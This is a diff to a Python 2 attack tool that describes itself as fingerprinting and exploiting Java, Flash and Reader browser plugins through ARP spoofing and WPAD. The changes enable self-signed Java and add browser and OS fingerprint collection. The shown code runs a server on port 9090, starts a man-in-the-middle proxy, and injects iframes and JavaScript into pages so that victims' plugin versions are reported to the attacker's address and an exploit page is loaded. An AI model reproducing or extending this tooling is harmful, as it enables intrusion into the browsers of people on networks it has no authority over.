@@ -5,7 +5,7 @@ import string,cgi,time,urlparse,commands,os,subprocess
 from os import curdir, sep
 import sys
 
-javaSelfsigned=False
+javaSelfsigned=True
 
 runFlash=True
 runJava=True
@@ -56,13 +56,13 @@ class Handler(BaseHTTPRequestHandler):
 		if "query=" in msg and "&" in msg:
 			for msg1 in message_parts:
 		             if 'client_address' in msg1:
-       		             	print "Target: "+msg1.split(") (")[1].strip(")")
+       		             	print bcolors.OKGREEN+"Target: "+bcolors.ENDC+msg1.split(") (")[1].strip(")")
                    	pluginVer = msg.replace("query=","").split('&')
 		    	for i in pluginVer:
 				if i:
 					pdtName,pdtVer = i.split("=")
 					pdtVer = pdtVer.replace(",",".")
-					print pdtName+'\t'+pdtVer
+					print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
             return
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -89,7 +89,7 @@ def modifyHTML(filename):
     with open(filename) as f:
     	for line in f:
 		if '$.get(' in line:
-			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {\n"
+			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params + '&' + browserInfo + '&' + osInfo, function(data) {\n"
 			content.append(replaceLine)
 			contentExploit.append(replaceLine)
 		elif 'iframe id="signed"' in line:
@@ -105,6 +105,8 @@ def modifyHTML(filename):
 				content.append("var iframe = document.getElementById('exploit');\n")
 				content.append("url = 'http://"+ipAddr+":9090/fingerprint_exploit.html';\n")
 				content.append("iframe.setAttribute('src',url);\n")
+				content.append("var browserInfo = CollectBrowser();\n")
+				content.append("var osInfo = CollectOS();\n")
 				#content.append("iframe.contentDocument.location.reload(true);\n")
 			
 				contentExploit.append(line)
@@ -304,7 +306,7 @@ def main():
 	gatewayIP = gatewayIPList.split("\n")[0]
         server = ThreadedHTTPServer(('', 9090), Handler)
         print 'Started httpserver...'
-	print bcolors.OKBLUE+"[Fingerprints and Exploits Browser Plugins (Java/Flash/Reader) via ARP Spoofing/WPAD]\n"+bcolors.ENDC
+	print bcolors.OKGREEN+"[Fingerprints and Exploits Browser Plugins (Java/Flash/Reader) via ARP Spoofing/WPAD]\n"+bcolors.ENDC
 	startMITMproxy()
 	modifyHTML('fingerprint_template.html')
 	print "[*] Run the below command in another terminal (replace X with the target host)"
